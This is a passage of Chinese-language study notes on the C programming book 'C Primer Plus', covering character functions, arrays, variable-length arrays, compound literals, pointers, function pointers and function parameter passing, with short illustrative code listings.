和<code>printf()</code>函数更快、更简洁。而且，注意 <code>getchar()</code>和 <code>putchar()</code>不需要转换说明，因为它们只处理字符。这两个函数通常定义在 <code>stdio.h</code>头文件</p><h2 id="ctype-h库"><a href="#ctype-h库" class="headerlink" title="ctype.h库"></a><code>ctype.h</code>库</h2><p>​C 有一系列专门处理字符的函数，ctype.h头文件包含了这些函数的原型。这些函数接受一个字符作为参数， 如果该字符属于某特殊的类别， 就返回一个非零值（真）；否则，返回0（假）。</p><p><img src="/./C-Primer-Plus_note/65a0127b5d47f.jpg"></p><p><img src="/./C-Primer-Plus_note/65a01277e389b.jpg"></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h1><p>数组（array）是按顺序储存的一系列类型相同的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> debts[<span class="number">20</span>];</span><br></pre></td></tr></table></figure><p>声明<code>debts</code>是一个内含20个元素的数组，每个元素都可以储存<code>float</code> 类型的值。数组的第1 个元素是<code>debts[0]</code> ， 第2 个元素是<code>debts[1]</code>，以此类推，直到<code>debts[19]</code>。</p><p><strong>注意，数组元素的编号从0开始，不是从1开始。</strong></p><p>字符组与字符串的差别</p><p>字符串最末尾有由<strong>空字符</strong><code>\0</code>，而字符组没有。如果<code>char</code>类型的数组末尾包含一个表示字符串末尾的空字符\0，则该<br>数组中的内容就构成了一个字符串</p><h2 id="指定数组大小"><a href="#指定数组大小" class="headerlink" title="指定数组大小"></a>指定数组大小</h2><p>在C99标准之前，声明数组时只能在方括号中使用整型常量表达式。所谓整型常量表达式，是由整型常量构成的表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> m = <span class="number">8</span>;</span><br><span class="line"><span class="type">float</span> a1[<span class="number">5</span>]; <span class="comment">// 可以</span></span><br><span class="line"><span class="type">float</span> a2[<span class="number">5</span>*<span class="number">2</span> + <span class="number">1</span>]; <span class="comment">//可以</span></span><br><span class="line"><span class="type">float</span> a3[<span class="keyword">sizeof</span>(<span class="type">int</span>) + <span class="number">1</span>]; <span class="comment">//可以</span></span><br><span class="line"><span class="type">float</span> a4[<span class="number">-4</span>]; <span class="comment">// 不可以，数组大小必须大于0</span></span><br><span class="line"><span class="type">float</span> a5[<span class="number">0</span>]; <span class="comment">// 不可以，数组大小必须大于0</span></span><br><span class="line"><span class="type">float</span> a6[<span class="number">2.5</span>]; <span class="comment">// 不可以，数组大小必须是整数</span></span><br><span class="line"><span class="type">float</span> a7[(<span class="type">int</span>)<span class="number">2.5</span>]; <span class="comment">// 可以，已被强制转换为整型常量</span></span><br><span class="line"><span class="type">float</span> a8[n]; <span class="comment">// C99之前不允许</span></span><br><span class="line"><span class="type">float</span> a9[m]; <span class="comment">// C99之前不允许</span></span><br></pre></td></tr></table></figure><h2 id="未指定数组大小"><a href="#未指定数组大小" class="headerlink" title="未指定数组大小"></a>未指定数组大小</h2><p>编译器会把数组的大小设置为足够装得下初始化的值。</p><h2 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> powers[<span class="number">8</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>&#125;; <span class="comment">/* 从ANSI C开始支持这种初始化 */</span></span><br></pre></td></tr></table></figure><p>如上所示，用以逗号分隔的值列表（用花括号括起来）来初始化数组，各值之间用逗号分隔。在逗号和值之间可以使用空格。根据上面的初始化，把 1 赋给数组的首元素（<code>powers[0]</code>），以此类推</p><p>除在声明时可使用<code>&#123;&#125;</code>对数组进行赋值，其他时候只能用<code>变量[序号] =</code> 对数组进行逐一赋值</p><p>注：使用const声明数组，可把数组设置为只读</p><h2 id="声明数组形参"><a href="#声明数组形参" class="headerlink" title="声明数组形参"></a>声明数组形参</h2><p>​因为数组名是该数组首元素的地址，作为实际参数的数组名要求形式参数是一个与之匹配的指针。只有在这种情况下，C才会把<code>int ar[]</code>和<code>int * ar</code>解释成一样。也就是说，ar是指向int的指针。由于函数<br>原型可以省略参数名，所以下面4种原型都是等价的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> *ar, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> ar[], <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> [], <span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure><p><strong>但是，在函数定义中不能省略参数名。</strong></p><h2 id="指定初始化器（适用于C99）"><a href="#指定初始化器（适用于C99）" class="headerlink" title="指定初始化器（适用于C99）"></a>指定初始化器（适用于C99）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">6</span>] = &#123;[<span class="number">5</span>] = <span class="number">212</span>&#125;; <span class="comment">// 把arr[5]初始化为212</span></span><br></pre></td></tr></table></figure><p>而C99规定，可以在初始化列表中使用带方括号的下标指明待初始化的元素</p><p>指定初始化的一些特性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> days[MONTHS] = &#123; <span class="number">31</span>, <span class="number">28</span>, [<span class="number">4</span>] = <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, [<span class="number">1</span>] = <span class="number">29</span> &#125;;</span><br></pre></td></tr></table></figure><ul><li>如果指定初始化器后面有更多的值，那么后面这些值将被用于初始化指定元素后面的元素。如该例中的初始化列表中的片段：[4] &#x3D;<br>31,30,31，那么后面这些值将被用于初始化指定元素后面的元素。</li><li>第二，如果再次初始化指定的元素，那么最后的初始化将会取代之前的初始化。。例如，程序清单10.5中，初始化列表开始<br>时把days[1]初始化为28，但是days[1]又被后面的指定初始化[1] &#x3D;29初始化为29。</li></ul><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据类型 变量[主数组个数][每个主数组所需的个数]</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> rain[<span class="number">5</span>][<span class="number">12</span>] =</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">4.3</span>,<span class="number">4.3</span>,<span class="number">4.3</span>,<span class="number">3.0</span>,<span class="number">2.0</span>,<span class="number">1.2</span>,<span class="number">0.2</span>,<span class="number">0.2</span>,<span class="number">0.4</span>,<span class="number">2.4</span>,<span class="number">3.5</span>,<span class="number">6.6</span>&#125;,</span><br><span class="line">&#123;<span class="number">8.5</span>,<span class="number">8.2</span>,<span class="number">1.2</span>,<span class="number">1.6</span>,<span class="number">2.4</span>,<span class="number">0.0</span>,<span class="number">5.2</span>,<span class="number">0.9</span>,<span class="number">0.3</span>,<span class="number">0.9</span>,<span class="number">1.4</span>,<span class="number">7.3</span>&#125;,</span><br><span class="line">&#123;<span class="number">9.1</span>,<span class="number">8.5</span>,<span class="number">6.7</span>,<span class="number">4.3</span>,<span class="number">2.1</span>,<span class="number">0.8</span>,<span class="number">0.2</span>,<span class="number">0.2</span>,<span class="number">1.1</span>,<span class="number">2.3</span>,<span class="number">6.1</span>,<span class="number">8.4</span>&#125;,</span><br><span class="line">&#123;<span class="number">7.2</span>,<span class="number">9.9</span>,<span class="number">8.4</span>,<span class="number">3.3</span>,<span class="number">1.2</span>,<span class="number">0.8</span>,<span class="number">0.4</span>,<span class="number">0.0</span>,<span class="number">0.6</span>,<span class="number">1.7</span>,<span class="number">4.3</span>,<span class="number">6.2</span>&#125;,</span><br><span class="line">&#123;<span class="number">7.6</span>,<span class="number">5.6</span>,<span class="number">3.8</span>,<span class="number">2.8</span>,<span class="number">3.8</span>,<span class="number">0.2</span>,<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">1.3</span>,<span class="number">2.6</span>,<span class="number">5.2</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初始化时也可省略内部的花括号，只保留最外面的一对花括号。只要保证初始化的数值个数正确，初始化的效果与上面相同。但是如果初始化的数值不够，则按照先后顺序逐行初始化，直到用完所有的值。</p><h2 id="其他多维数组"><a href="#其他多维数组" class="headerlink" title="其他多维数组"></a>其他多维数组</h2><p>二维数组的相关内容都适用于三维数组或更多维的数组。</p><h2 id="const修饰数组"><a href="#const修饰数组" class="headerlink" title="const修饰数组"></a><code>const</code>修饰数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> days[MONTHS] = &#123;<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br></pre></td></tr></table></figure><p>如果程序稍后尝试改变数组元素的值，编译器将生成一个编译期错误消息。</p><p>如果此时声明指向这个<code>const</code>数组，<strong>此时指针也必须用<code>const</code>修饰</strong>，且不能修改解引用指针的值，否则都将报错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*pd = <span class="number">29.89</span>; <span class="comment">// 不允许</span></span><br><span class="line">pd[<span class="number">2</span>] = <span class="number">222.22</span>; <span class="comment">//不允许</span></span><br></pre></td></tr></table></figure><p>但可以进行指针加法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd++; <span class="comment">/* 让pd指向rates[1] -- 没问题 */</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>把<code>const</code>数据或<code>非const</code>数据的地址初始化为指向<code>const</code>的指针或为其赋值是合法的，此时不能修改解引用指针的值</p><h2 id="变长数组（适用C99）"><a href="#变长数组（适用C99）" class="headerlink" title="变长数组（适用C99）"></a>变长数组（适用C99）</h2><p><strong>在创建数组时，可以使用变量指定数组的维度。</strong></p><p>注：变长数组中的“变”不是指可以修改已创建数组的大小。一旦创建了变长数组，它的大小则保持不变。这里的“变”指的是：</p><h3 id="声明一个带二维变长数组参数的函数"><a href="#声明一个带二维变长数组参数的函数" class="headerlink" title="声明一个带二维变长数组参数的函数"></a>声明一个带二维变长数组参数的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum2d</span><span class="params">(<span class="type">int</span> rows, <span class="type">int</span> cols, <span class="type">int</span> ar[rows][cols])</span>;</span><br></pre></td></tr></table></figure><p>注：前两个形参（rows和cols）用作第3个形参二维数组ar的两个维度。因为ar的声明要使用rows和cols，所以在形参列表中必须在声明ar之前先声明这两个形参。</p><p>以下为错误写法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum2d</span><span class="params">(<span class="type">int</span> ar[rows][cols], <span class="type">int</span> rows, <span class="type">int</span> cols)</span>;</span><br></pre></td></tr></table></figure><p>变形</p><p>C99&#x2F;C11标准规定，可以省略原型中的形参名，但是在这种情况下，必须用星号来代替省略的维度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum2d</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span> ar[*][*])</span>;</span><br></pre></td></tr></table></figure><p><strong>需要注意的是</strong></p><ul><li>在函数定义的形参列表中声明的变长数组并未实际创建数组。</li><li>和传统的语法类似，变长数组名实际上是一个指针。这说明带变长数组形参的函数实际上是在原始数组中处理数组，因此可以修改传入的数组。</li></ul><h2 id="复合字面量（使用C99）"><a href="#复合字面量（使用C99）" class="headerlink" title="复合字面量（使用C99）"></a>复合字面量（使用C99）</h2><p><strong>字面量是除符号常量外的常量</strong>。例如，5是int类型字面量， 81.3是double类型的字面量</p><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>下面的复合字面量创建了一个和diva数组相同的<strong>匿名数组</strong>，也有两个int类型的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">int</span> [<span class="number">2</span>])&#123;<span class="number">10</span>, <span class="number">20</span>&#125; <span class="comment">// 复合字面量</span></span><br></pre></td></tr></table></figure><p><strong>其中<code>int [2]</code>即是复合字面量的类型名。</strong></p><p>初始化有数组名的数组时可以省略数组大小，复合字面量也可以省略大小，编译器会自动计算数组当前的元素个数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">int</span> [])&#123;<span class="number">50</span>, <span class="number">20</span>, <span class="number">90</span>&#125; <span class="comment">// 内含3个元素的复合字面量</span></span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>因为复合字面量是匿名的，所以不能先创建然后再使用它，必须在创建的同时使用它</p><p>用法一：使用指针记录地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> * pt1;</span><br><span class="line">pt1 = (<span class="type">int</span> [<span class="number">2</span>]) &#123;<span class="number">10</span>, <span class="number">20</span>&#125;;</span><br></pre></td></tr></table></figure><p>用法二：把复合字面量作为实际参数传递给带有匹配形式参数的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">const</span> <span class="type">int</span> ar[], <span class="type">int</span> n)</span>;</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> total3;</span><br><span class="line">total3 = sum((<span class="type">int</span> [])&#123;<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>&#125;, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><h2 id="本章注意点：-5"><a href="#本章注意点：-5" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><h3 id="数组名是数组首元素的地址。"><a href="#数组名是数组首元素的地址。" class="headerlink" title="数组名是数组首元素的地址。"></a>数组名是数组首元素的地址。</h3><p>如果flizny是一个数组，下面的语句成立：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flizny == &amp;flizny[<span class="number">0</span>]; <span class="comment">// 数组名是该数组首元素的地址</span></span><br></pre></td></tr></table></figure><h3 id="多维数组的双重间接性质"><a href="#多维数组的双重间接性质" class="headerlink" title="多维数组的双重间接性质"></a>多维数组的双重间接性质</h3><p>假设有下面的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> zippo[<span class="number">4</span>][<span class="number">2</span>]; <span class="comment">/* 内含int数组的数组 */</span></span><br></pre></td></tr></table></figure><ul><li>然后数组名zippo是该数组首元素的地址。</li><li>1.因为<code>zippo</code>是数组首元素的地址，所以<code>zippo</code>的值和<code>&amp;zippo[0]</code>的值相同。而<code>zippo[0]</code>本身是一个内含两个整数的数组，所以<code>zippo[0]</code><br>的值和它首元素（一个整数）的地址（即<code>&amp;zippo[0][0]</code>的值）相同。</li><li>简而言之，<code>zippo[0]</code>是一个占用一个int大小对象的地址，而<code>zippo</code>是一个占用两个int大小对象的地址。由于这个整数和内含两个整数的数组都开始于同一个地址，所以<code>zippo</code>、<code>zippo[0]</code>、<code>zippo[0][0]</code>的值相同。</li><li>2.给指针或地址加1，其值会增加对应类型大小的数值。在这方面，<code>zippo</code>和<code>zippo[0]</code>不同，因为<code>zippo</code>指向的对象占用了两个<code>int</code>大小，而<code>zippo[0]</code> 指向的对象只占用一个int 大小。因此， <code>zippo + 1</code> 和<code>zippo[0] + 1</code>的值不同。</li><li>3.<code>**zippo</code>与<code>*&amp;zippo[0][0]</code>等价，这相当于<code>zippo[0][0]</code></li><li>4.解引用一个指针（在指针前使用<code>*</code>运算符）或在数组名后使用带下标的<code>[]</code>运算符，得到引用对象代表的值。其中解引用主数组的结果就是次数组，即 <code>*zippo == zippo[0]</code>成立。</li><li>总结：<strong>将数组理解成数组的数组。</strong>因占用地址为首元素的数据类型大小及其个数，<code>zippo[0]</code>是一个占用一个int大小对象的地址，而<code>zippo</code>是一个占用两个int大小对象的地址。由于主数组为<code>zippo[]</code>的合集，故<code>zippo + 1</code> 和<code>zippo[0] + 1</code>的值不同。即<code>zippo + 1 == zippo[1]</code>成立，<code>zippo[0]+1 == zippo[0][1]</code>。解引用主数组形参就是得到主数组的第一个值，也就是次数组<code>zippo[0]</code></li></ul><h3 id="数组中sizeof-的使用"><a href="#数组中sizeof-的使用" class="headerlink" title="数组中sizeof()的使用"></a>数组中<code>sizeof()</code>的使用</h3><p>在数组中<code>sizeof()</code>被视为整型常量，可以用于声明数组内的数目，如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="keyword">sizeof</span>(<span class="type">int</span>)];</span><br></pre></td></tr></table></figure><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a><strong>指针</strong></h1><p>指针（pointer）是一个值为内存地址的变量（或数据对象）。</p><h2 id="声明指针"><a href="#声明指针" class="headerlink" title="声明指针"></a>声明指针</h2><h3 id="1-声明变量的指针"><a href="#1-声明变量的指针" class="headerlink" title="1.声明变量的指针"></a>1.声明变量的指针</h3><p>因声明指针变量时必须指定指针所指向变量的类型，因为不同的变量类型占用不同的存储空间，一些指针操作要求知道操作对象的大小。另外，程序必须知道储存在指定地址上的数据类型。</p><p>以下为声明指针的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> * pi; <span class="comment">// pi是指向int类型变量的指针</span></span><br><span class="line"><span class="type">char</span> * pc; <span class="comment">// pc是指向char类型变量的指针</span></span><br><span class="line"><span class="type">float</span> * pf, * pg; <span class="comment">// pf、pg都是指向float类型变量的指针</span></span><br></pre></td></tr></table></figure><p>类型说明符表明了指针所指向对象的类型，星号（*）表明声明的变量是一个指针。</p><h3 id="2-声明多维数组的指针"><a href="#2-声明多维数组的指针" class="headerlink" title="2.声明多维数组的指针"></a>2.声明多维数组的指针</h3><p>多维数组的指针会有不同大小的地址，因此多维数组的指针在声明是必须指向一个内含对应个数和对应文件类型的数组</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (* pz)[<span class="number">2</span>]; <span class="comment">// pz指向一个内含两个int类型值的数组</span></span><br></pre></td></tr></table></figure><p>前面有圆括号的版本，<code>*</code>先与<code>pz</code>结合，因此声明的是一个指向数组（内含两个<code>int</code>类型的值）的指针。</p><p>区别于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> * pax[<span class="number">2</span>]; <span class="comment">// pax是一个内含两个指针元素的数组，每个元素都指向int的指针</span></span><br></pre></td></tr></table></figure><p>由于[]优先级高，先与<code>pax</code>结合，所以<code>pax</code>成为一个内含两个元素的数组。然后<code>*</code>表示<code>pax</code>数组内含两个指针。最后，<code>int</code>表示<code>pax</code>数组中的指针都指向<code>int</code>类型的值。因此，这行代码声明了两个指向<code>int</code>的指针</p><h3 id="3-声明函数指针"><a href="#3-声明函数指针" class="headerlink" title="3.声明函数指针"></a>3.声明函数指针</h3><p>方式一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数返回类型 (*指针名)(函数列表); <span class="comment">// 声明函数指针</span></span><br><span class="line"></span><br><span class="line">指针名 = 函数名; <span class="comment">// 将add函数的地址赋值给函数指针（函数名实际上是函数地址）</span></span><br></pre></td></tr></table></figure><p>方式二</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数返回类型 (*指针名)(函数列表) = &amp;函数名; <span class="comment">// 声明并初始化函数指针</span></span><br></pre></td></tr></table></figure><h3 id="4-声明指向指针的指针"><a href="#4-声明指向指针的指针" class="headerlink" title="4.声明指向指针的指针"></a>4.声明指向指针的指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指向的指针数据类型** 指针名 = &amp;被指向的指针</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* ptr = &amp;num;        <span class="comment">// 指向int类型的指针</span></span><br><span class="line"><span class="type">int</span>** ptrToPtr = &amp;ptr;  <span class="comment">// 指向int*类型的指针</span></span><br></pre></td></tr></table></figure><h2 id="8种基本用法"><a href="#8种基本用法" class="headerlink" title="8种基本用法"></a>8种基本用法</h2><ol><li>赋值</li><li>解引用</li><li>取址</li><li>指针与整数相加</li><li>递增指针</li><li>指针减去一个整数</li><li>递减指针</li><li>指针求差</li></ol><p>注：</p><ul><li><p>关系运算符可以比较两个指针的值</p></li><li><p>可以用一个指针减去另一个指针得到一个整数，或者用一个指针减去一个整数得到另一个指针。</p></li><li><p>指针和指针不能直接相加</p></li></ul><h2 id="指针运算与递增递减操作"><a href="#指针运算与递增递减操作" class="headerlink" title="指针运算与递增递减操作"></a>指针运算与递增递减操作</h2><p>特别注意，只有<strong>指针变量</strong>可以进行递增递减操作，如数组名，字符串常量等<strong>指针常量</strong>等不能进行递增递减操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[] = <span class="string">&quot;NO&quot;</span></span><br><span class="line"><span class="type">char</span> * pi = <span class="string">&quot;YES&quot;</span></span><br><span class="line">++pi; <span class="comment">//正确</span></span><br><span class="line">++a;  <span class="comment">//错误</span></span><br></pre></td></tr></table></figure><h2 id="解引用未初始化的指针"><a href="#解引用未初始化的指针" class="headerlink" title="解引用未初始化的指针"></a>解引用未初始化的指针</h2><p>切记：创建一个指针时，系统只分配了储存指针本身的内存，并未分配储存数据的内存。</p><p>指针未被初始化，其值是一个随机值，所以不知道5将储存在何处。这可能不会出什么错，也可能会擦写数据或代码，或者导致程序崩溃</p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>在C语言中，函数指针允许我们将函数的地址存储在指针变量中，并通过该指针变量来调用函数。其调用格式与函数相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指针名（参数列表）;</span><br></pre></td></tr></table></figure><p>使用实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*operation)(<span class="type">int</span>, <span class="type">int</span>); <span class="comment">// 声明函数指针</span></span><br><span class="line"></span><br><span class="line">    operation = add; <span class="comment">// 将add函数的地址赋值给函数指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Addition: %d\n&quot;</span>, operation(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 调用add函数</span></span><br><span class="line"></span><br><span class="line">    operation = subtract; <span class="comment">// 将subtract函数的地址赋值给函数指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Subtraction: %d\n&quot;</span>, operation(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 调用subtract函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="指针的兼容性"><a href="#指针的兼容性" class="headerlink" title="指针的兼容性"></a>指针的兼容性</h2><p>指针之间的赋值比数值类型之间的赋值要严格。两个类型的指针不能相互赋值。</p><h2 id="本章注意点：-6"><a href="#本章注意点：-6" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><h3 id="指针加法"><a href="#指针加法" class="headerlink" title="指针加法"></a>指针加法</h3><p>在C中，指针加1指的是增加一个存储单元，指针加1的操作并不是简单地将指针的值增加1，而是将指针向后移动一个存储单元的大小。。对数组而言，这意味着把加1后的地址是下一个元素的地址，而不是下一个字节的地址。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h1><h2 id="函数的声明、定义与引用"><a href="#函数的声明、定义与引用" class="headerlink" title="函数的声明、定义与引用"></a>函数的声明、定义与引用</h2><h3 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数定义的数据返回类型 函数名(参数列表);</span><br></pre></td></tr></table></figure><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据返回类型 函数名(参数列表)</span><br><span class="line">&#123;</span><br><span class="line">函数体</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> 返回变量;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数引用"><a href="#函数引用" class="headerlink" title="函数引用"></a>函数引用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(参数列表)</span><br></pre></td></tr></table></figure><h2 id="函数参数的传递"><a href="#函数参数的传递" class="headerlink" title="函数参数的传递"></a>函数参数的传递</h2><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><p>编写一个处理基本类型（如，<code>int</code>）的函数时，要选择是传递int类型的值还是传递指向int的指针。通常都是直接传递数值，只有程序需要在函数中改变该数值时，才会传递指针</p><p>这意味着在C语言中，函数参数传递是按值传递的，这意味着在函数调用时，实参的值会被复制到形参中。实参不会因为函数中的语句而被修改，但可利用指针，修改实参的内存地址所对应的值来进行修改实参。</p><p>例：交换两个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 